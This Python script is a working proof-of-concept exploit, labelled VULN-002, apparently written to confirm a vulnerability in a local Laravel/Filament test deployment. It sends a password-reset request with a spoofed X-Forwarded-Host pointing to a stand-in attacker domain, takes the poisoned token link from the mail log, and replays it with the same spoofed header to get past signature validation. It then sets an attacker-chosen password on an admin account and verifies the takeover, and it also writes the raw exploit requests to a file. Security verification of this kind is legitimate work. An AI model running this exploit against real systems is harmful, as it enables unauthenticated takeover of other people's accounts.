#!/usr/bin/env python3
r"""
VULN-002 — Password-reset link built from attacker-controlled Host / X-Forwarded-Host
           => full account takeover (ATO), including admin.

Vulnerable code : targets/academico/bootstrap/app.php:16
                     $middleware->trustProxies(at: '*');   # X-Forwarded-Host honored verbatim
                  targets/academico/app/Providers/Filament/AdminPanelProvider.php:33
                     ->passwordReset()                     # enabled, with NO URL pinning
                  (no URL::forceRootUrl / forceScheme / trustHosts anywhere in app/ + config/)
CWE             : CWE-640 (Weak Password Recovery) via CWE-644 (Host header injection)

The flaw
--------
Filament computes the password-reset URL synchronously from the request host using
URL::signedRoute(absolute:true) — whose absolute root is request()->root(). Because
the app trusts ALL proxies and never pins its root URL to config('app.url'), an
attacker who sets `X-Forwarded-Host: evil.attacker.tld` on the reset-request POST
makes the VICTIM's reset email contain a link to evil.attacker.tld carrying the real,
valid email+token(+signature).

The reset route DOES carry Illuminate\Routing\Middleware\ValidateSignature (contrary
to the report's note), so a naive replay to the real host is rejected (403) — the
signature was computed over the evil host. BUT the same trustProxies('*') setting lets
the attacker replay the captured link to the real server while ALSO spoofing
`X-Forwarded-Host: evil.attacker.tld`: ValidateSignature recomputes the signature from
`$request->url()`, which under trustProxies honors the spoofed host, so the signature
matches and the check passes. The signature protection is therefore inert against this
attacker. The attacker then sets a new password and owns the account.

Exploitation idea
-----------------
1. POST a reset request for the victim with X-Forwarded-Host: evil.attacker.tld.
2. Read the poisoned link out of the (log-driver) mail — host == evil.attacker.tld.
3. Show a replay WITHOUT the host spoof is 403 (signature enforced) and WITH the host
   spoof is 200 (signature bypassed).
4. Submit a new password via the reset form; log in as the victim with it.

What a successful run proves
---------------------------
The reset email points at an attacker host; the captured token+signature let the
attacker set the victim's password; login with the new password succeeds and the old
password stops working => unauthenticated account takeover.

Note on target functional bug: config/auth.php defaults the broker table to
'password_reset_tokens', but the shipped migration chain leaves it named
'password_resets' (create -> rename -> revert), so reset 500s as-shipped. That is a
functional bug masking the security bug; a working deployment must align the two (set
AUTH_PASSWORD_RESET_TOKEN_TABLE or the table name). This exploit aligns them (renames
the table to match the shipped config default) as a documented precondition; the
host-poisoning ATO is independent of that mismatch.
"""
import os
import re
import secrets
import sys
import time
import urllib.parse

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import lwlib
from lwlib import log

VULN = "VULN-002"
HERE = os.path.dirname(os.path.abspath(__file__))
EVIL_HOST = os.environ.get("OOB_HOST", "evil.attacker.tld")   # the attacker-controlled host


def ensure_reset_table():
    """Idempotently align the password-reset table name with the shipped config default
    ('password_reset_tokens'), restoring the reset feature broken by the target's
    migrate/revert mismatch. No-op if the table already has the expected name."""
    check = lwlib.container_exec(
        "sh", "-c",
        "php artisan tinker --execute='echo Schema::hasTable(\"password_reset_tokens\")?1:0;' 2>/dev/null")
    if check.strip().endswith("1"):
        return "already present"
    lwlib.tinker(
        'if(Schema::hasTable("password_resets") && !Schema::hasTable("password_reset_tokens"))'
        '{ Schema::rename("password_resets","password_reset_tokens"); echo "renamed"; } else { echo "n/a"; }')
    return "renamed password_resets -> password_reset_tokens"


def create_victim():
    """Create a fresh victim ADMIN account (random suffix). ATO of an admin is the
    worst case and demonstrates the full impact."""
    suffix = secrets.token_hex(4)
    email = f"victim_{suffix}@example.invalid"
    old_pass = f"OldPass_{suffix}"
    php = (
        'use App\\Models\\User; use Illuminate\\Support\\Facades\\Hash;'
        f'$u=User::firstOrCreate(["email"=>"{email}"],["username"=>"victim_{suffix}",'
        f'"firstname"=>"Vic","lastname"=>"{suffix}","password"=>Hash::make("{old_pass}"),"locale"=>"en"]);'
        'if(!$u->hasRole("admin")) $u->assignRole("admin"); echo "victim_id=".$u->id;'
    )
    out = lwlib.tinker(php)
    return email, old_pass, out.strip()


def trigger_reset(victim_email):
    """Attacker POSTs the reset request for the victim, spoofing X-Forwarded-Host."""
    s = lwlib.new_session()
    r = s.get(lwlib.BASE_URL + "/admin/password-reset/request", timeout=30)
    csrf = lwlib.csrf_of(r.text)
    snap, _ = lwlib.find_snapshot(r.text, "RequestPasswordReset")
    resp = lwlib.lw_update(
        s, snap,
        updates={"data.email": victim_email},
        calls=[{"path": "", "method": "request", "params": []}],
        csrf=csrf,
        extra_headers={"X-Forwarded-Host": EVIL_HOST, "X-Forwarded-Proto": "https"},
    )
    return resp


def extract_poisoned_link(victim_email):
    """Pull the freshest reset URL for the victim out of the mail log."""
    log_text = lwlib.read_laravel_log_tail(60000)
    enc_email = urllib.parse.quote(victim_email)
    pat = re.compile(r"https?://[^\s\"<>]*password-reset/reset[^\s\"<>)]*")
    hits = [u for u in pat.findall(log_text) if enc_email in u or victim_email in u]
    # Normalise HTML entity &amp; -> &
    hits = [u.replace("&amp;", "&") for u in hits]
    return hits[-1] if hits else None


def main():
    lwlib.banner(VULN, "Password-reset Host-header poisoning -> account takeover",
                 "Filament passwordReset URL from request host + trustProxies('*') defeats ValidateSignature")

    # ---- SETUP -----------------------------------------------------------------
    log("SETUP", f"aligning reset-token table with shipped config: {ensure_reset_table()}")
    victim_email, old_pass, vinfo = create_victim()
    log("SETUP", f"created victim ADMIN {victim_email} ({vinfo}), old password known only to us")

    # ---- STEP 1: poison the reset email with the attacker host ------------------
    log("STEP", f"POST reset request for the victim with X-Forwarded-Host: {EVIL_HOST}")
    resp = trigger_reset(victim_email)
    log("INFO", f"reset request HTTP {resp.status_code} (notification queued: "
                f"{'yes' if 'notifications' in resp.text else 'unknown'})")
    if resp.status_code != 200:
        log("FAIL", f"reset request failed ({resp.status_code}): {resp.text[:200]}")
        lwlib.verdict(VULN, "FAILED", "reset request did not succeed")
        sys.exit(1)

    # The notification is ShouldQueue -> run one worker so it renders into the mail log.
    log("STEP", "processing the mail queue (queue:work --once) so the email is rendered to the log")
    lwlib.queue_work_once()
    time.sleep(1)

    # ---- PROOF 1: the emailed link points at the attacker's host ---------------
    link = extract_poisoned_link(victim_email)
    if not link:
        log("FAIL", "no reset link found in the mail log")
        lwlib.verdict(VULN, "FAILED", "poisoned link not produced")
        sys.exit(1)
    host = urllib.parse.urlparse(link).netloc
    q = urllib.parse.parse_qs(urllib.parse.urlparse(link).query)
    token = q.get("token", [""])[0]
    signature = q.get("signature", [""])[0]
    log("PROOF", f"victim's reset email links to host '{host}' (attacker-controlled) with a "
                 f"valid token={token[:12]}... and signature={signature[:12]}...")
    if EVIL_HOST not in host:
        log("FAIL", f"link host is '{host}', not the attacker host '{EVIL_HOST}'")
        lwlib.verdict(VULN, "FAILED", "host not poisoned")
        sys.exit(1)

    # Build the equivalent link against the REAL server (only the host differs).
    real_qs = urllib.parse.urlparse(link).query.replace("&amp;", "&")
    replay_url = f"{lwlib.BASE_URL}/admin/password-reset/reset?{real_qs}"

    # ---- STEP 2: show the signature IS enforced, but bypassable via host spoof --
    log("STEP", "replaying the captured link to the REAL server WITHOUT the host spoof")
    plain = lwlib.new_session().get(replay_url, timeout=30)
    log("INFO", f"  -> HTTP {plain.status_code} (403 == ValidateSignature rejects the foreign-host signature)")

    log("STEP", f"replaying WITH the host spoof (X-Forwarded-Host: {EVIL_HOST})")
    spoof_hdr = {"X-Forwarded-Host": EVIL_HOST, "X-Forwarded-Proto": "https"}
    s = lwlib.new_session()
    reset_page = s.get(replay_url, headers=spoof_hdr, timeout=30)
    log("INFO", f"  -> HTTP {reset_page.status_code} (200 == signature recomputed over the spoofed "
                "host now matches; the check is inert)")
    if not (plain.status_code == 403 and reset_page.status_code == 200):
        log("FAIL", f"unexpected signature behaviour: plain={plain.status_code}, spoof={reset_page.status_code}")
        lwlib.verdict(VULN, "NEEDS_MANUAL", "signature bypass did not behave as expected")
        sys.exit(1)

    # ---- STEP 3: set a new password and take over the account ------------------
    lwlib.strip_secure_cookies(s)     # https-marked session cookie -> resend over http
    csrf = lwlib.csrf_of(reset_page.text)
    snap, _ = lwlib.find_snapshot(reset_page.text, "ResetPassword")
    new_pass = f"PwnedByAttacker_{secrets.token_hex(3)}!1"
    log("STEP", "submitting a NEW password through the reset form (email+token already in the form state)")
    r = lwlib.lw_update(
        s, snap,
        updates={"password": new_pass, "passwordConfirmation": new_pass},
        calls=[{"path": "", "method": "resetPassword", "params": []}],
        csrf=csrf, extra_headers=spoof_hdr,
    )
    log("INFO", f"resetPassword HTTP {r.status_code} (redirect effect: {'yes' if 'redirect' in r.text else 'no'})")

    # ---- PROOF 2: log in as the victim with the attacker-chosen password --------
    log("STEP", "verifying takeover: log in as the victim with the attacker's new password")
    new_ok = lwlib.filament_login(lwlib.new_session(), victim_email, new_pass)
    old_ok = lwlib.filament_login(lwlib.new_session(), victim_email, old_pass)
    log("INFO", f"login with NEW password: {new_ok} | login with OLD password: {old_ok}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### 1) Poison the reset email (attacker, unauthenticated)\n")
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update\nHost: localhost:20000\n")
        f.write(f"X-Forwarded-Host: {EVIL_HOST}\nX-Forwarded-Proto: https\n\n")
        f.write('{"components":[{"snapshot":"<RequestPasswordReset snapshot>",'
                f'"updates":{{"data.email":"{victim_email}"}},'
                '"calls":[{"path":"","method":"request","params":[]}]}]}\n\n')
        f.write("### 2) Replay the captured link to the real server WITH host spoof (passes ValidateSignature)\n")
        f.write(f"GET /admin/password-reset/reset?{real_qs}\nX-Forwarded-Host: {EVIL_HOST}\nX-Forwarded-Proto: https\n\n")
        f.write("### 3) Set the new password\n")
        f.write(f"POST /livewire-{lwlib.LW_HASH}/update\nX-Forwarded-Host: {EVIL_HOST}\n\n")
        f.write('{"components":[{"snapshot":"<ResetPassword snapshot>",'
                '"updates":{"password":"<attacker pw>","passwordConfirmation":"<attacker pw>"},'
                '"calls":[{"path":"","method":"resetPassword","params":[]}]}]}\n')
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"Poisoned reset link (from mail log):\n{link}\n\n")
        f.write(f"Replay WITHOUT host spoof: HTTP {plain.status_code} (signature enforced)\n")
        f.write(f"Replay WITH host spoof:    HTTP {reset_page.status_code} (signature bypassed)\n")
        f.write(f"resetPassword: HTTP {r.status_code}\n\n")
        f.write(f"Login with attacker's NEW password: {new_ok}\n")
        f.write(f"Login with victim's OLD password:   {old_ok}\n")

    if new_ok and not old_ok:
        log("PROOF", f"logged in as the victim admin with the attacker-chosen password; the victim's "
                     f"original password no longer works => account taken over")
        log("OK", "exploit confirmed — unauthenticated password-reset host poisoning yields full ATO")
        lwlib.verdict(VULN, "CONFIRMED",
                      "X-Forwarded-Host poisons the reset link and defeats ValidateSignature -> admin ATO")
        sys.exit(0)

    log("FAIL", f"takeover not achieved (new_ok={new_ok}, old_ok={old_ok})")
    lwlib.verdict(VULN, "FAILED", "password was not taken over")
    sys.exit(1)


if __name__ == "__main__":
    main()
